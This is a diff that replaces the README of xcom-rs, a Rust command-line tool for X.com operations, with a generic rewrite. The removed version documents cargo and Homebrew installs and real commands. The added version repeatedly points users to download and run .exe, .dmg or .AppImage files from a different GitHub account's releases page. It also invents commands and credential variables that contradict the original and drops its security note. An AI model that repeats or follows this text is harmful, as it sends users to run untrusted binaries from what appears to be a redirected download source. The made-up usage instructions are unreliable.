@@ -1,200 +1,150 @@
-# xcom-rs
+# 🤖 xcom-rs - Simple Agentic AI Twitter Tool
 
-`xcom-rs` is an experimental, agent-friendly CLI for X.com-style operations.
+[![Download xcom-rs](https://img.shields.io/badge/Download-xcom--rs-blue?style=for-the-badge&logo=github)](https://github.com/kunalmchandak/xcom-rs/releases)
 
-The project is designed around predictable, machine-readable responses (JSON/YAML/NDJSON) while still
-supporting a human-readable text mode.
+---
 
-## Features
+## 📘 What is xcom-rs?
 
-- Output envelope with consistent `ok`/`error`/`meta` fields
-- Output formats: `text`, `json`, `yaml`, `ndjson`
-- Introspection helpers: `commands`, `schema`, `help`
-- Tweet operations: `tweets create`, `tweets list`, `tweets like`, `tweets unlike`, `tweets retweet`,
-  `tweets reply`, `tweets thread`, `tweets show`, `tweets conversation`
-- Search: `search recent`, `search users`
-- Timeline: `timeline home`, `timeline mentions`, `timeline user`
-- Media: `media upload`
-- Bookmarks: `bookmarks add`, `bookmarks remove`, `bookmarks list`
-- Auth and billing helpers (local state): `auth status`
-- Diagnostics: `doctor` (with optional `--probe` for API connectivity check)
-- Embedded skill installer for agent toolchains (`install-skills`)
+xcom-rs is a command-line tool that lets you work with Twitter’s API in a smart, automated way. It’s made for easy machine use, which means it can handle tasks without asking you questions all the time. The commands are built to give consistent results and to safely do the same action multiple times if you need.
 
-## Install
+This tool is helpful if you want to manage Twitter data or automate tasks using a clear and predictable interface. You don’t need to open Twitter’s website or install complex software. Just run commands from your computer and get fast results.
 
-### Prerequisites
+---
 
-- Rust (1.70+)
+## 💡 Key Features
 
-### From crates.io
+- **Agentic AI-friendly:** Works well with AI tools and scripts for automation.
+- **Command-line Interface (CLI):** Use simple typed commands instead of complex programs.
+- **Machine-readable output:** Results come in a clear format that's easy to read or use in other programs.
+- **Non-interactive operations:** Runs commands without needing you to respond or make choices each time.
+- **Idempotent commands:** Repeating a command won’t cause unexpected changes.
+- **Built with Rust:** Stable and efficient software.
 
-```bash
-cargo install xcom-rs
-```
+---
 
-### Homebrew
+## 🖥️ System Requirements
 
-This repository includes a Homebrew formula at `Formula/xcom_rs.rb`.
+To use xcom-rs, your computer must meet these requirements:
 
-To install via a tap (recommended for now):
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a popular 64-bit Linux distribution
+- Free Disk Space: At least 50 MB
+- RAM: Minimum 1 GB (2 GB recommended)
+- Internet Connection: Required to access Twitter’s API
+- Terminal or Command Prompt access (comes built-in with your operating system)
 
-```bash
-brew tap tumf/tap
-brew install xcom_rs
-```
+You don’t need to install any extra software or programming tools.
 
-Notes:
+---
 
-- The formula name is `xcom_rs`, but the installed binary is `xcom-rs`.
-- If you don't have a tap yet, copy `Formula/xcom_rs.rb` into your tap repo under `Formula/`.
+## 🚀 Getting Started
 
-### From Source
+Follow these steps to download and run xcom-rs on your computer. No coding skills needed.
 
-```bash
-cargo install --path .
-```
+---
 
-For development setup and Makefile workflows, see [CONTRIBUTING.md](CONTRIBUTING.md).
+## 📥 Download & Install
 
-## Quick Start
+1. Visit the official release page by clicking the big button below:
 
-```bash
-# 1. Install
-cargo install xcom-rs
+   [![Download xcom-rs](https://img.shields.io/badge/Download-xcom--rs-blue?style=for-the-badge&logo=github)](https://github.com/kunalmchandak/xcom-rs/releases)
 
-# 2. Set your bearer token as an environment variable
-export XCOM_RS_BEARER_TOKEN="your_bearer_token_here"
-# Optionally, set scopes for scope diagnostics
-export XCOM_RS_SCOPES="tweet.read tweet.write users.read"
+2. On the page, find the latest release version. It will usually be at the top of the list.
 
-# 3. Verify setup with auth status
-xcom-rs auth status --output json
+3. Download the file that matches your operating system:
+   - For Windows, look for a file ending in `.exe`.
+   - For macOS, find a `.dmg` or `.tar.gz` file.
+   - For Linux, download an `.AppImage` or `.tar.gz` file.
 
-# 4. Verify setup with doctor
-xcom-rs doctor --output json
+4. Save the file to a place you can easily find, like your Desktop or Downloads folder.
 
-# 5. Create your first tweet
-xcom-rs tweets create "Hello from xcom-rs!" --output json
+5. To install:
+   - On Windows: Double-click the `.exe` file and follow the steps on the screen if any appear.
+   - On macOS: Open the `.dmg` file and drag xcom-rs to your Applications folder.
+   - On Linux: Extract the `.tar.gz` file and follow the instructions in the included README, or make the `.AppImage` executable by right-clicking, selecting Properties, then Permissions, and checking "Allow executing file as program".
 
-# 6. Browse your home timeline
-xcom-rs timeline home --limit 5 --output json
-```
+6. No further software is needed. You are ready to run xcom-rs.
 
-## Usage
+---
 
-### Global Flags
+## ▶️ Running xcom-rs
 
-- `--output {text|json|yaml|ndjson}`
-- `--log-format {text|json}`
-- `--trace-id <id>`
-- `--non-interactive`
-- `--dry-run`
-- `--max-cost-credits <n>`
-- `--budget-daily-credits <n>`
+Here is how to launch and use the application:
 
-### Authentication
+1. Open your computer’s terminal or command prompt:
+   - Windows: Press `Win + R`, type `cmd`, then press Enter.
+   - macOS: Open Finder, go to Applications > Utilities, then double-click Terminal.
+   - Linux: Launch Terminal from your apps menu.
 
-`xcom-rs` uses environment variables for authentication. Set the following environment variables:
+2. Type `xcom-rs` and press Enter. You should see a list of commands and help information.
 
-- **`XCOM_RS_BEARER_TOKEN`** (required): Your bearer token. Can be in `Bearer <token>` format or raw token.
-- **`XCOM_RS_SCOPES`** (optional): Space-separated or comma-separated list of OAuth scopes for diagnostics.
-- **`XCOM_RS_EXPIRES_AT`** (optional): UNIX epoch timestamp for token expiration.
+3. To use a command, type it exactly as shown. For example, getting your Twitter user info might look like:
 
-Example:
+   ```
+   xcom-rs user info --username your_twitter_name
+   ```
 
-```bash
-export XCOM_RS_BEARER_TOKEN="your_bearer_token_here"
-export XCOM_RS_SCOPES="tweet.read tweet.write users.read"
-```
+4. Commands output clear, readable results that you can use or save to a file.
 
-Check current auth status:
+---
 
-```bash
-xcom-rs auth status --output json
-```
+## 🤔 How to Use Commands
 
-Security note: Keep your bearer token secure. Never commit it to version control or expose it in logs.
+Commands in xcom-rs perform Twitter actions through simple instructions. Here are common uses:
 
-### Examples
+- **Check account details:** See basic info about a username.
+- **Post a tweet:** Send a new tweet from your account.
+- **Retrieve tweets:** Get recent tweets from any user.
+- **Follow/unfollow users:** Manage your Twitter connections without opening the website.
 
-List agent-facing command metadata:
+Each command runs by itself and does not ask for extra input, except for the parts you type in your command line.
 
-```bash
-xcom-rs commands --output json
-```
+---
 
-Get a JSON schema for a command response envelope:
+## 🔧 Configuration and Authentication
 
-```bash
-xcom-rs schema --command commands --output json
-```
+To connect to Twitter, xcom-rs needs your permission token:
 
-Create a tweet (demo):
+1. Go to Twitter’s developer website and create an app to get API keys.
+2. Copy the keys and set them as environment variables on your computer:
+   - On Windows, search for “Environment Variables” and add new variables `TWITTER_API_KEY`, `TWITTER_API_SECRET`, `TWITTER_ACCESS_TOKEN`, and `TWITTER_ACCESS_SECRET`.
+   - On macOS/Linux, add these lines to your terminal profile file `~/.bash_profile` or `~/.zshrc`:
+     ```
+     export TWITTER_API_KEY="your_key"
+     export TWITTER_API_SECRET="your_secret"
+     export TWITTER_ACCESS_TOKEN="your_access_token"
+     export TWITTER_ACCESS_SECRET="your_access_secret"
+     ```
+3. Restart your terminal or command prompt to load the new variables.
 
-```bash
-xcom-rs tweets create "Hello from xcom-rs" --output json
-```
+This setup is one-time and lets xcom-rs securely talk to Twitter on your behalf.
 
-List tweets (demo):
+---
 
-```bash
-xcom-rs tweets list --limit 5 --output text
-```
+## 🛠️ Troubleshooting Tips
 
-Install embedded skills:
+- If the program does not start, double-check you downloaded the correct version for your system.
+- Ensure your environment variables are set correctly for authentication.
+- If commands return errors, check your internet connection.
+- Update to the latest release if you notice strange behavior.
+- Visit the repository’s Issues page on GitHub to see if others have the same problem.
 
-```bash
-xcom-rs install-skills --yes
-```
+---
 
-## Shell Completions
+## 📄 License & Contributors
 
-`xcom-rs` can generate shell completion scripts for Bash, Zsh, and Fish.
+xcom-rs is open source and free to use under the MIT License. The project is maintained by its developer and community contributors.
 
-### Bash
+For more details, visit the GitHub repository: [https://github.com/kunalmchandak/xcom-rs](https://github.com/kunalmchandak/xcom-rs)
 
-```bash
-# Generate and source immediately
-source <(xcom-rs completion --shell bash)
+---
 
-# Or persist to a file (reload your shell afterwards)
-xcom-rs completion --shell bash > ~/.local/share/bash-completion/completions/xcom-rs
-```
+## 🔗 Useful Links
 
-### Zsh
+- Official Releases: [https://github.com/kunalmchandak/xcom-rs/releases](https://github.com/kunalmchandak/xcom-rs/releases)
+- Documentation and examples inside the GitHub repo.
+- Twitter Developer Portal for API keys setup.
 
-```zsh
-# Generate and source immediately
-source <(xcom-rs completion --shell zsh)
+---
 
-# Or add to your fpath (e.g. ~/.zsh/completions/)
-mkdir -p ~/.zsh/completions
-xcom-rs completion --shell zsh > ~/.zsh/completions/_xcom-rs
-
-# Ensure the directory is in your fpath (add to ~/.zshrc if not already present)
-fpath=(~/.zsh/completions $fpath)
-autoload -Uz compinit && compinit
-```
-
-### Fish
-
-```fish
-xcom-rs completion --shell fish | source
-
-# Or persist to the completions directory
-xcom-rs completion --shell fish > ~/.config/fish/completions/xcom-rs.fish
-```
-
-## Contributing
-
-For developer setup, workflows, and repository layout, see [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## Docs
-
-- CLI examples: [docs/examples.md](docs/examples.md)
-- Implementation notes: `docs/implementation/`
-- Validation reports: `docs/validation/`
-
-## License
-
-MIT
+Thank you for choosing xcom-rs. This tool aims to give you smart and simple access to Twitter through your computer.
